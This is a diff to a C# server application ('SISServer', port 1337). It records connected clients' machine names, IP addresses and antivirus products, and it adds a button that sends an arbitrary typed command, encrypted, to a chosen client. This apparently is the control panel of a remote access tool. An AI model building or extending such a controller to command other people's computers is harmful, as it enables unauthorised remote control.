@@ -21,7 +21,7 @@ namespace SISServer
         private const int _BUFFER_SIZE = 20971520;
         private const int _PORT = 1337;
         private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
-
+        private string connectedID, connectedName = "";
         public Form1()
         {
             InitializeComponent();
@@ -144,17 +144,18 @@ namespace SISServer
 
         private void setlvClientInfoCallback(String name, String ip, String av, int id)
         {
-            if (this.InvokeRequired) //if we need to invoke
+            if (this.InvokeRequired)
             {
-                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback); //Create a new callback
-                this.Invoke(k, new object[] { name, ip, av, id }); //Invoke the callback
+                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback);
+                this.Invoke(k, new object[] { name, ip, av, id });
             }
             else
             {
-                ListViewItem client = listView1.Items[id]; //Get the client's list item
-                client.SubItems.Add(name); //Set the machine name
-                client.SubItems.Add(ip); //Set the mmachine IPv4 local address
-                client.SubItems.Add(av); //Set the machine anti virus product
+                ListViewItem client = listView1.Items[id];
+                client.SubItems.Add(name);
+                client.SubItems.Add(ip);
+                client.SubItems.Add(av);
+                connectedName = name;
             }
         }
 
@@ -235,7 +236,9 @@ namespace SISServer
             if(listView1.SelectedItems.Count > 0)
             {
                 string id = listView1.SelectedItems[0].Text;
-                sendCommand("control", int.Parse(id));
+                //sendCommand("control", int.Parse(id));
+                connectedID = id;
+                label3.Text = connectedName;
             }
         }
 
@@ -247,6 +250,11 @@ namespace SISServer
             String crypted = Encrypt(k);
             byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
             s.Send(data);
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+                sendCommand(textBox1.Text, int.Parse(connectedID));
         }
     }
 }
